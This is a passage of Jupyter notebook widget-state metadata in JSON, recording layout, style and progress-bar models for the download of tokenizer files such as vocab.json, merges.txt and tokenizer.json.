            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b83ecbae79ae4fa2a537c9cdcd0b682e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "cdaa9db2b71d47e9a1aeefaed548cdbc": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "f71be5ea0d3d4a509e94368e0e9e32b7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "7739c23345b645969f1b78f781ccce62": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "202c677f7541424f82511a75fabe8f7d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "b89a598d131948e2a25600adfa323f02": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_6be0872bd3c54a74a19115ee1af3e93f",
              "IPY_MODEL_cc6add0de6b84514873b52ad9a1cb10c",
              "IPY_MODEL_972f19c2c66e4b7c8a2364d90bdc5efd"
            ],
            "layout": "IPY_MODEL_05eafa810a1a4799a88243f07406a738"
          }
        },
        "6be0872bd3c54a74a19115ee1af3e93f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_6c86aca7035743cbb3d69b2ad13c788c",
            "placeholder": "​",
            "style": "IPY_MODEL_2f4840822e4e4dbea05b69f6d9488d39",
            "value": "vocab.json: "
          }
        },
        "cc6add0de6b84514873b52ad9a1cb10c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8e2f1c83fa294543871a2abb5a19d98a",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_07ed800ab7ee4646aae498faadf60298",
            "value": 1
          }
        },
        "972f19c2c66e4b7c8a2364d90bdc5efd": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a0ab1f695e6349419d5b5b540eb97a00",
            "placeholder": "​",
            "style": "IPY_MODEL_fefe0e6cc07647399a23dc5ab3ab2430",
            "value": " 2.78M/? [00:00&lt;00:00, 34.4MB/s]"
          }
        },
        "05eafa810a1a4799a88243f07406a738": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6c86aca7035743cbb3d69b2ad13c788c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2f4840822e4e4dbea05b69f6d9488d39": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "8e2f1c83fa294543871a2abb5a19d98a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "07ed800ab7ee4646aae498faadf60298": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "a0ab1f695e6349419d5b5b540eb97a00": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fefe0e6cc07647399a23dc5ab3ab2430": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "73ad305807984e3ba23191e5f96b3630": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_59c8bb3d108c4e6198c11f67c4490a6b",
              "IPY_MODEL_aaaabbfbe2d74d549cf2a94a28a3cef7",
              "IPY_MODEL_27a62b65fd4a4c6cb51403b821403c86"
            ],
            "layout": "IPY_MODEL_e73f229514da40a9852c0c4cf815e791"
          }
        },
        "59c8bb3d108c4e6198c11f67c4490a6b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_57b816c631a34294968367a7dd7f6e03",
            "placeholder": "​",
            "style": "IPY_MODEL_0df0828a78e8490b8a58f64c3e1e2672",
            "value": "merges.txt: "
          }
        },
        "aaaabbfbe2d74d549cf2a94a28a3cef7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_a97f4ac2acb8493c9806c9a52958a910",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_9414231f99c84cefb65aff441cfe4a93",
            "value": 1
          }
        },
        "27a62b65fd4a4c6cb51403b821403c86": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_be7cb937b73d49538b5448e44ca4c185",
            "placeholder": "​",
            "style": "IPY_MODEL_2cd694cc655d40eb9f0aa8962d12ecb5",
            "value": " 1.67M/? [00:00&lt;00:00, 85.0MB/s]"
          }
        },
        "e73f229514da40a9852c0c4cf815e791": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "57b816c631a34294968367a7dd7f6e03": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0df0828a78e8490b8a58f64c3e1e2672": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "a97f4ac2acb8493c9806c9a52958a910": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "9414231f99c84cefb65aff441cfe4a93": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "be7cb937b73d49538b5448e44ca4c185": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2cd694cc655d40eb9f0aa8962d12ecb5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "68d6f4c2c3384d1984a3d84ca9bd8e15": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_db6e4170a80c4dc9b6db3a37b9016edb",
              "IPY_MODEL_bc4918d3201046308696d39b4976d25b",
              "IPY_MODEL_a851702e3fa5484fad46fc63348b21d2"
            ],
            "layout": "IPY_MODEL_b0c4e532eba941608def0bc55ea35d44"
          }
        },
        "db6e4170a80c4dc9b6db3a37b9016edb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_277371c4602d4e579e4155050d0481d3",
            "placeholder": "​",
            "style": "IPY_MODEL_4edc9afe8507490c977a7d4a2e230d6a",
            "value": "tokenizer.json: 100%"
          }
        },
        "bc4918d3201046308696d39b4976d25b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7223726cf3eb44b894899e9b7a5257e4",
            "max": 11422654,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_50aa418a6f164dbea1379711802c7bcb",
            "value": 11422654
          }
        },
        "a851702e3fa5484fad46fc63348b21d2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_d2a373d0a9424b3e8e6007290e8a62ef",
            "placeholder": "​",
            "style": "IPY_MODEL_eae8c40081534c398b11083477a75fd4",
            "value": " 11.4M/11.4M [00:00&lt;00:00, 19.3MB/s]"
          }
        },
        "b0c4e532eba941608def0bc55ea35d44": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "277371c4602d4e579e4155050d0481d3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4edc9afe8507490c977a7d4a2e230d6a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7223726cf3eb44b894899e9b7a5257e4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "50aa418a6f164dbea1379711802c7bcb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "d2a373d0a9424b3e8e6007290e8a62ef": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
